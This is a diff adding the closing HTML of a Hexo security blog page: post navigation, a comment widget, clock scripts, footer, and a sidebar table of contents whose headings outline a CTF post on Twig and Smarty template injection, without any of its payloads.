+                        <img src="/images/sa.svg" alt="sa">
+                        </p>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+  <nav class="post-pagination">
+    
+      <div class="post-prev">
+        <span class="nav-label">Previous Post</span>
+        <a href="/2026/07/13/XXE%E6%BC%8F%E6%B4%9E/">XXE漏洞</a>
+      </div>
+    
+    
+      <div class="post-next">
+        <span class="nav-label">Next Post</span>
+        <a href="/2026/07/15/%E5%85%B6%E4%BB%96%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/">其他类型的数据库的注入</a>
+      </div>
+    
+  </nav>
+  
+<link href="https://unpkg.com/@waline/client@v3/dist/waline.css" rel="stylesheet">
+<div class="comments-container night">
+    <div id="waline"></div>
+    <script type="module">
+      import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js';
+      init({
+        el: '#waline',
+        serverURL: '',
+        dark: 'html.dark',
+        pageview: true,
+        commentClassName: 'prose prose-neutral dark:prose-invert min-w-0 max-w-none',
+        lang: 'zh-CH', //
+        avatar: 'mm', //
+        meta: ['nick', 'mail'], //
+        pageSize: 10, //
+        visitor: true, //
+        commentCount: true, //
+        requiredFields: ['nick', 'mail'], //
+      });
+    </script>
+    </div>
+
+
+</div>
+
+<script src="/js/copy.js"></script>
+
+<aside class="sidebar-container sidebar-right">
+    <div class="sidebar-bg">
+        <p id="date"></p>
+<script>
+  function updateDate() {
+    var now = new Date();
+    var dateString = now.toISOString().slice(0, 10);
+    document.getElementById('date').textContent = dateString;
+  }
+
+  window.addEventListener('load', function() {
+    updateDate();
+    // 更新频率为每5分钟更新一次，减少不必要的更新
+    setInterval(updateDate, 300000);
+  });
+</script>
+        <span id="clock" role="timer" aria-live="polite"></span>
+
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const clockElement = document.getElementById('clock');
+    let timerInterval;
+
+    // 格式化时间函数
+    function formatTime(unit) {
+      return unit < 10 ? '0' + unit : unit;
+    }
+
+    // 更新时钟 - 包含秒
+    function updateClock() {
+      const now = new Date();
+      const hours = formatTime(now.getHours());
+      const minutes = formatTime(now.getMinutes());
+      const seconds = formatTime(now.getSeconds());
+      clockElement.textContent = `${hours}:${minutes}:${seconds}`;
+    }
+
+    // 初始化时钟
+    function startClock() {
+      // 立即更新一次时间
+      updateClock();
+      // 每秒更新一次
+      timerInterval = setInterval(updateClock, 1000);
+    }
+
+    // 页面可见性变化时的优化
+    document.addEventListener('visibilitychange', function() {
+      if (document.hidden) {
+        // 页面不可见时停止更新
+        clearInterval(timerInterval);
+      } else {
+        // 页面重新可见时，重新开始
+        clearInterval(timerInterval);
+        startClock();
+      }
+    });
+
+    // 启动时钟
+    startClock();
+  });
+</script>
+
+
+    </div>
+    <div class="sidebar-bg">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#twig%E4%B8%8Esmarty%E6%A8%A1%E6%9D%BF%E7%9A%84ssti"><span class="toc-number">1.</span> <span class="toc-text">twig与smarty模板的ssti</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">模板介绍:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%B8%E5%BF%83%E8%AF%AD%E6%B3%95"><span class="toc-number">1.2.</span> <span class="toc-text">核心语法:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Twig"><span class="toc-number">1.3.</span> <span class="toc-text">Twig</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E6%8E%A2%E6%B5%8B%EF%BC%9A-%E7%A1%AE%E8%AE%A4%E6%A8%A1%E6%9D%BF"><span class="toc-number">1.3.1.</span> <span class="toc-text">基础探测：(确认模板)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.3.2.</span> <span class="toc-text">信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.3.3.</span> <span class="toc-text">命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%99webshell"><span class="toc-number">1.3.4.</span> <span class="toc-text">写webshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#smarty"><span class="toc-number">1.4.</span> <span class="toc-text">smarty</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%88%E6%9C%AC%E6%8E%A2%E6%B5%8B"><span class="toc-number">1.4.1.</span> <span class="toc-text">版本探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-1"><span class="toc-number">1.4.2.</span> <span class="toc-text">命令执行</span></a></li></ol></li></ol></li></ol>
+    </div>
+    <div class="sidebar-bg">
+        <div class="card-tags">
+            
+                <a href="/tags/CTF/" class="tag" aria-label="标签: #CTF">#CTF</a>
+            
+                <a href="/tags/Web%E5%AE%89%E5%85%A8/" class="tag" aria-label="标签: #Web安全">#Web安全</a>
+            
+                <a href="/tags/SSTI/" class="tag" aria-label="标签: #SSTI">#SSTI</a>
+            
+        </div>
+    </div>
+    <div>
+        <div class="categories-list">
+            
+                <div class="category-item">
+                    <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" aria-label="分类: 网络安全">
+                        网络安全
+                        <span>(12)</span>
+                    </a>
+                </div>
+            
+        </div>
+    </div>
+</aside>
+
+    <!-- No categories available -->
+
+
+    <footer>
+    <span id="busuanzi_container_site_pv" style="display: inline;"></span>
+    <span>👁<span id="busuanzi_value_site_pv"></span></span>
+    <div class="padding border border-sub border-dotted fadein-right">
+        <span style="color:aliceblue">👤<span id="busuanzi_value_site_uv"></span></span>
+    </div>
+    <span>
+        Powered by <a target="_blank" rel="noopener" href="https://hexo.io" alt="Hexo">
+            <p class="hover-underline night" style="display: inline;">Hexo</p>
+        </a>
+        <p style="display: inline; color: red;">❤</p>
+        Built with <a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang" alt="Wang">
+            <p class="hover-underline night" style="display: inline;">Wang</p>
+        </a> Theme
+    </span>
+
+    <!-- 带图片的链接 -->
+    <div class="footer-links">
+        
+    </div>
+
+    <!-- 纯文本链接 -->
+    <div class="footer-text-links">
+        
+            
+                <a href="" target="_blank" rel="noopener">
+                    宏愿纵未了,奋斗总不太晚
+                </a>
+            
+        
+    </div>
+</footer>
+    
+<script src="/js/background.js"></script>
+    
+        
+<script src="/js/search.js"></script>
+    
+</main>
+</body>
+</html>
